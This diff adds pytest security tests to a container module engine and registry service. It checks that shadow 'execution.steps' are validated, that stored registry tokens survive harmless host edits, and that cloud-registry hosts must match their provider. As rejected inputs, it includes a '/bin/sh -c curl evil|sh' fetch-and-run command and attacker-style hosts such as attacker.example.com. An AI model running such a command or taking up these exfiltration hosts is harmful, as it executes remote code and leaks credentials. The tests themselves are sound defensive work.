@@ -412,3 +412,139 @@ class TestRenderRejectsNonScalars:
         e = self._engine(tmp_path)
         assert e._render_str("{{inputs.a}}-{{inputs.b}}", {"a": "x", "b": 5}) == "x-5"
         assert e._render_str("{{inputs.missing}}", {}) == ""
+
+
+@pytest.mark.unit
+class TestShadowStepSet:
+    """The engine and the validator must resolve the SAME steps (review finding).
+
+    `_resolve_steps` preferred `execution.steps` and no validator read it, so a
+    manifest could present benign argv at `steps` for review while
+    `execution.steps` ran a shell — bypassing the denylist, the shell-token
+    check and the collision check at once, in a step pod holding cloud
+    credentials.
+    """
+
+    def _manifest(self, **extra):
+        m = {"schema_version": 1, "name": "r", "version": "1.0.0", "kind": "container_image",
+             "container_image": {"registry_host": "ghcr.io", "repository": "o/r",
+                                 "digest": "sha256:" + "a" * 64}}
+        m.update(extra)
+        return m
+
+    def _validate(self, m):
+        from services.module_metadata import ModuleMetadataValidator
+        return ModuleMetadataValidator().validate_artifact_manifest(
+            m, registry_host_allowlist=["ghcr.io"])
+
+    def test_declaring_steps_in_both_places_is_rejected(self):
+        from services.module_metadata import InvalidMetadataSchemaError
+
+        m = self._manifest(
+            steps={"apply": [{"name": "benign", "args": ["tool", "version"]}]},
+            execution={"steps": {"apply": [
+                {"name": "shell", "args": ["/bin/sh", "-c", "curl evil|sh"]}]}},
+        )
+        with pytest.raises(InvalidMetadataSchemaError, match="both"):
+            self._validate(m)
+
+    def test_execution_steps_are_validated_when_they_are_the_only_set(self):
+        """The shadow set is no longer unreviewed — the denylist reaches it."""
+        from services.module_metadata import InvalidMetadataSchemaError
+
+        m = self._manifest(execution={"steps": {"apply": [
+            {"name": "shell", "args": ["/bin/sh", "-c", "curl evil|sh"]}]}})
+        with pytest.raises(InvalidMetadataSchemaError):
+            self._validate(m)
+
+    def test_engine_and_validator_resolve_the_same_set(self):
+        from unittest.mock import MagicMock
+
+        from services.execution.container_engine import ContainerEngine
+        from services.execution.engine_interface import ModuleContext
+        from services.module_metadata import canonical_step_sets
+
+        manifest = self._manifest(execution={"steps": {"apply": [
+            {"name": "only", "args": ["tool", "run"]}]}})
+        engine = ContainerEngine(MagicMock(), workspace_host_path="/tmp/x",
+                                 workspace_local_path="/tmp/x")
+        ctx = ModuleContext(module_id=1, project_id=1, path="p", category="container",
+                            pack_manifest=manifest)
+
+        assert engine._resolve_steps(ctx, "apply") == canonical_step_sets(manifest)["apply"]
+
+
+@pytest.mark.component
+class TestHostCanonicalisation:
+    """A case-only host edit must not destroy write-only credentials."""
+
+    def _reg(self, db, **kw):
+        from models import ContainerRegistry
+        reg = ContainerRegistry(registry_host="harbor.internal", **kw)
+        db.add(reg)
+        db.commit()
+        db.refresh(reg)
+        return reg
+
+    def _update(self, db, reg, **payload):
+        from routes.container_registries import ContainerRegistryUpdate
+        from services.container_registry_service import ContainerRegistryService
+        ContainerRegistryService(db).update_registry(reg.id, ContainerRegistryUpdate(**payload))
+        db.refresh(reg)
+
+    @pytest.mark.parametrize("new_host", [
+        "Harbor.Internal", "  harbor.internal  ", "harbor.internal/", "harbor.internal:443",
+    ])
+    def test_semantically_null_host_edits_preserve_the_credential(self, db, new_host):
+        """Every consumer strips/lowercases, so these are no-ops for matching."""
+        reg = self._reg(db, name=f"h-{abs(hash(new_host))%9999}", type="harbor",
+                        token_encrypted="enc_precious")
+        self._update(db, reg, registry_host=new_host)
+        assert reg.token_encrypted == "enc_precious", (
+            f"a semantically-null host edit ({new_host!r}) destroyed a write-only "
+            "credential that may be impossible to re-obtain"
+        )
+
+    def test_a_real_host_change_still_clears(self, db):
+        """Contrast: the actual exfil vector must still be closed."""
+        reg = self._reg(db, name="h-real", type="harbor", token_encrypted="enc_precious")
+        self._update(db, reg, registry_host="attacker.example.com")
+        assert reg.token_encrypted is None
+
+
+@pytest.mark.unit
+class TestDerivedHostMustMatchProvider:
+    """A derived registry mints a LIVE cloud token when tested (review finding)."""
+
+    def _svc(self):
+        from unittest.mock import MagicMock
+
+        from services.container_registry_service import ContainerRegistryService
+        return ContainerRegistryService(MagicMock())
+
+    def _reg(self, type_, host):
+        import types
+        return types.SimpleNamespace(type=type_, registry_host=host)
+
+    @pytest.mark.parametrize("type_,host", [
+        ("ecr", "attacker.example.com"),
+        ("ecr", "123456789012.dkr.ecr.us-east-1.amazonaws.com.evil.net"),
+        ("icr", "evil.io"),
+    ])
+    def test_non_provider_hosts_are_refused(self, type_, host):
+        from core.errors import BadRequestError
+        with pytest.raises(BadRequestError, match="(?i)not a valid"):
+            self._svc()._assert_derived_host_matches_provider(self._reg(type_, host))
+
+    @pytest.mark.parametrize("type_,host", [
+        ("ecr", "123456789012.dkr.ecr.us-east-1.amazonaws.com"),
+        ("icr", "us.icr.io"), ("icr", "icr.io"),
+    ])
+    def test_real_provider_hosts_are_allowed(self, type_, host):
+        self._svc()._assert_derived_host_matches_provider(self._reg(type_, host))
+
+    def test_standalone_types_are_untouched(self):
+        """Self-hosted Harbor/Artifactory on any name must keep working — the
+        reason a general host allowlist was rejected in the first place."""
+        for t in ("harbor", "artifactory", "distribution", "oci"):
+            self._svc()._assert_derived_host_matches_provider(self._reg(t, "anything.internal"))
